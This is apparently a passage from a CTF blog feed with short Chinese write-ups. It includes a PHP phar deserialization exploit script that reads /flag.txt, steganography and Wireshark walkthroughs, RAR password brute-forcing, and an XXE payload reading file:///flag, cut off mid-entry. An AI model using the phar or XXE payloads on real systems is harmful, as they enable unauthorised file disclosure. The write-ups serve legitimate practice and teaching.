keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//1</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h2><p>用下面的脚本生成一个phar的文件，然后看一下phar的原理，菜狗痛枯。<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/flag.txt"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><del>先鸽一下</del></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-藏藏藏</title>
      <link href="2020/10/05/BJDCTF2020-%E8%97%8F%E8%97%8F%E8%97%8F/"/>
      <url>2020/10/05/BJDCTF2020-%E8%97%8F%E8%97%8F%E8%97%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>先给拉到kal里面，并改名为<code>1.jpg</code>，用命令<code>binwalk 1.jpg</code>看到下面有个压缩包。</p><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>用命令<code>foremost 1.jpg</code>直接分离出zip文件，foremost牛x。</p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>压缩包里面有word文档，拉到windows里面打开后是一张二维码，扫描后是flag<br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;you are the best!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 文件隐写 </tag>
            
            <tag> foremost简单使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-你猜我是个啥</title>
      <link href="2020/10/05/BJDCTF2020-%E4%BD%A0%E7%8C%9C%E6%88%91%E6%98%AF%E4%B8%AA%E5%95%A5/"/>
      <url>2020/10/05/BJDCTF2020-%E4%BD%A0%E7%8C%9C%E6%88%91%E6%98%AF%E4%B8%AA%E5%95%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="改后缀名"><a href="#改后缀名" class="headerlink" title="改后缀名"></a>改后缀名</h2><p>将后缀名改为.txt后用记事本打开得flag</p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;i_am_fl@g&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>新生题目好简单呀，我去，但是一直练新手题提升不了实力的，要变强还得练高手们做的题。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 文件隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020_一叶障目</title>
      <link href="2020/10/05/BJDCTF2020-%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE/"/>
      <url>2020/10/05/BJDCTF2020-%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><p>用winhex改下宽高度值，就是第二行的第六个位置把01改为03就哦可了。</p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;66666&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 图片隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>菜刀666</title>
      <link href="2020/10/04/%E8%8F%9C%E5%88%80666/"/>
      <url>2020/10/04/%E8%8F%9C%E5%88%80666/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="搜索点（wireshark字符串搜索）"><a href="#搜索点（wireshark字符串搜索）" class="headerlink" title="搜索点（wireshark字符串搜索）"></a>搜索点（wireshark字符串搜索）</h2><p>wireshark搜索字符串的时候也是用的ctrl + f快捷键，有所不同的是把原来的过滤器换为字符串就行了。搜到后追踪流可以发现那个压缩包与txt文件。</p><h2 id="找到关键位置"><a href="#找到关键位置" class="headerlink" title="找到关键位置"></a>找到关键位置</h2><p>往下追踪流，到tcp.stream eq 7的时候找到了关键的位置，然后可以用下面的东西解码<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc%3D"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>出现的第一个东西是个文件的地址为<code>D:\wamp64\www\upload\6666.jpg</code>,第二个是图片</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2nd-EasyBaBa</title>
      <link href="2020/10/04/BJDCTF2nd-EasyBaBa/"/>
      <url>2020/10/04/BJDCTF2nd-EasyBaBa/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-先用binwalk查看文件"><a href="#0x01-先用binwalk查看文件" class="headerlink" title="0x01 先用binwalk查看文件"></a>0x01 先用binwalk查看文件</h2><blockquote><p>binwalk ezbb.jpg</p></blockquote><p>发现里面有隐藏的文件，这个只有一个图片文件的，要不就是文件隐藏，要不就是什么色道那种（这种不太会）。</p><h2 id="0x02-用foremost分开文件"><a href="#0x02-用foremost分开文件" class="headerlink" title="0x02 用foremost分开文件"></a>0x02 用foremost分开文件</h2><blockquote><p>foremost ezbb.jpg<br>什么都不用指定就能分解出，分出的文件在output目录里面，有个压缩包，解压后是个jpg的文件，拉到windows里面，用记事本打开，发现开头有RIFF文件头（AVI格式文件），将后缀名改为.avi后打开，果然里面藏了个视频（图片里藏视频，文件隐写真奇妙。）</p></blockquote><h2 id="0x03-pr打开扫码"><a href="#0x03-pr打开扫码" class="headerlink" title="0x03 pr打开扫码"></a>0x03 pr打开扫码</h2><p>里面很明显可以看到几帧不正常的图片，打开pr扫码吧，分为几部分，下面一行就是一张图片获得的结果<br><pre class="line-numbers language-none"><code class="language-none">6167696E5F6C6F76655F59424A447B696D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>最后一张图片太模糊了，想用大佬的<a href="https://merricx.github.io/qrazybox/">这个项目</a>，但是又太麻烦，直接写了。忙活3个小时了。。。<br><pre class="line-numbers language-none"><code class="language-none">316E677D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>和一起<br><pre class="line-numbers language-none"><code class="language-none">6167696E5F6C6F76655F59424A447B696D316E677D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>解出来后顺序有错，调一下位置就好了。<br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">BJD&#123;imagin_love_Y1ng&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>注意把BJD换为flag</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc文件隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
      <link href="2020/10/04/Web1-Dropbox/"/>
      <url>2020/10/04/Web1-Dropbox/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019神奇的二维码</title>
      <link href="2020/10/03/SWPU2019%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
      <url>2020/10/03/SWPU2019%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-先用binwalk查看图片"><a href="#0x01-先用binwalk查看图片" class="headerlink" title="0x01 先用binwalk查看图片"></a>0x01 先用binwalk查看图片</h2><p>图片隐写的一般套路就是这样，先直接用binwalk+文件名查看里面的各个文件的信息，然后加个<code>-e</code>参数可以提取里面的各个文件到一个文件夹了。</p><h2 id="0x02-拉到windows里面"><a href="#0x02-拉到windows里面" class="headerlink" title="0x02　拉到windows里面"></a>0x02　拉到windows里面</h2><p>用windows把里面能直接解压的解压，然后有个不能解压的，看样子是个音频，第一个文件夹是个图片和一个rar，第二个文件是encode的文件，解密后就是第一个文件夹里的rar压缩包的密码，拉出来后还是个图片，没搞出来。</p><h2 id="0x03-音频隐写"><a href="#0x03-音频隐写" class="headerlink" title="0x03 音频隐写"></a>0x03 音频隐写</h2><p>第三个文件夹里面是个doc文件，打开后是好长一段的base64加密。作为python的忠实用户，肯定要写一段<code>python3</code>脚本来解决这个问题啊！<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64a <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入需要解密的base64："</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"多重解密结束!"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>如IDE有划线，请自动忽略。。。<br>解密后为<code>comEON_YOuAreSOSoS0great</code>，用此密码将音频文件拉出来。</p><h2 id="0x04-使用AU分析"><a href="#0x04-使用AU分析" class="headerlink" title="0x04 使用AU分析"></a>0x04 使用AU分析</h2><pre class="line-numbers language-none"><code class="language-none">--&#x2F;---&#x2F;.-.&#x2F;...&#x2F;.&#x2F;..&#x2F;...&#x2F;...-&#x2F;.&#x2F;.-.&#x2F;-.--&#x2F;...-&#x2F;.&#x2F;.-.&#x2F;-.--&#x2F;.&#x2F;.-&#x2F;...&#x2F;-.--&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解码后为<code>MORSEISVERYVERYEASY</code><br>所以flag为<br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;MORSEISVERYVERYEASY&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;morseisveryveryeasy&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转为小写的python3代码为（没错，这么简单也要写成代码）<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入："</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><blockquote><p>总结: 不知道这种音频隐写能不能用python来搞，明天或者有空的时候再搞吧！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 隐写 </tag>
            
            <tag> 音频隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被偷走的文件</title>
      <link href="2020/10/03/%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E6%96%87%E4%BB%B6/"/>
      <url>2020/10/03/%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-流量分析"><a href="#0x01-流量分析" class="headerlink" title="0x01 流量分析"></a>0x01 流量分析</h2><p>首先下载下来弹出来了个让输入密码的框框，然后取消后也能正常地解压，放在kali里面用wireshark打开，搜索关键词<code>flag</code>，发现有个ftp的流量，追踪一下发现是个flag.rar(其实不用追踪就能看得到)，然后过滤ftp的流量，将过滤器的选项换为<code>ftp-data</code>就只有一个流量，追踪，保留原始数据（开始为ASCII的那个地方），save as，保存为rar后缀名的文件，发现有密码，kali解不开。</p><h2 id="0x02-rar穷举解密"><a href="#0x02-rar穷举解密" class="headerlink" title="0x02 rar穷举解密"></a>0x02 rar穷举解密</h2><p>用软件ARCHPR破解密码，但是速度有一点点慢，从四位数字开始测，口令为5790，阿巴阿巴。输入密码得flag</p>]]></content>
      
      
      <categories>
          
          <category> misc文件隐写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 文件隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CSAWQual 2019]Web_Unagi</title>
      <link href="2020/09/30/2019-Web-Unagi/"/>
      <url>2020/09/30/2019-Web-Unagi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="判断xxe"><a href="#判断xxe" class="headerlink" title="判断xxe"></a>判断xxe</h2><p>首先看下各个界面有什么信息，看到upload界面有一个upload的功能，可以上传新的用户。然后看到here的那个链接里面的内容是xml格式的，所以我们很容易就能联想得到使用xxe、xml外部实体注入。上传一个xml文件就好了</p><h2 id="上传xxe文件"><a href="#上传xxe文件" class="headerlink" title="上传xxe文件"></a>上传xxe文件</h2><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">users</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>lice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span 